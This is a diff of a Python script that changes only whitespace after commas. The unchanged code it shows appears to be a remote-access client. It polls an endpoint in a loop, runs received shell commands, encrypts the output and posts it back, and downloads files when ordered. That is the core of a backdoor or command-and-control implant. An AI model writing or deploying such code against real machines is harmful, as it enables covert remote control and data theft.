@@ -40,18 +40,18 @@ def main(endpoint_url):
                     id = data.get('id')
 
                     if command_type.startswith('dl'):
-                        download_file(cid,id,ec, command, method, headers, body)
+                        download_file(cid, id, ec, command, method, headers, body)
                     if command_type.startswith('filedl'):
-                        download_file(cid,id,ec, command)
+                        download_file(cid, id, ec, command)
                     if command_type == 'cmd':
-                        execute_command(cid,id,ec, command)
+                        execute_command(cid, id, ec, command)
 
             except Exception as e:
-                send_error(cid, id,f"Error during command execution: {e}")
+                send_error(cid, id, f"Error during command execution: {e}")
             time.sleep(2)
 
 
-def execute_command(cid,id,ec, command):
+def execute_command(cid, id, ec, command):
     """Function to execute a command"""
     try:
         if platform.system() == 'Windows':
@@ -64,14 +64,14 @@ def execute_command(cid,id,ec, command):
         payload = {'output': ec.encrypt_content(output), "id": id, "cid": cid}
         response = requests.post(endpoint_url + "/command", json=payload)
         if response.status_code != 200:
-            send_error(cid,id, "Failed to send the result to the endpoint.")
+            send_error(cid, id, "Failed to send the result to the endpoint.")
     except subprocess.CalledProcessError as e:
-        send_error(cid,id, f"Error during command execution: {e.output}")
+        send_error(cid, id, f"Error during command execution: {e.output}")
     except Exception as e:
-        send_error(cid,id, f"Error during command execution: {e}")
+        send_error(cid, id, f"Error during command execution: {e}")
 
 
-def send_file(cid,id, file, name):
+def send_file(cid, id, file, name):
     """Function to send a file to the endpoint"""
     if not name:
         name = file.name
@@ -87,7 +87,7 @@ def send_error(cid, id, msg):
                           data={"id": id, "cid": cid, "ret": msg})
 
 
-def download_file(cid, id,ec, file_url, method=None, headers=None, body=None):
+def download_file(cid, id, ec, file_url, method=None, headers=None, body=None):
     """Function to download a file from the given URL"""
     try:
         if method:
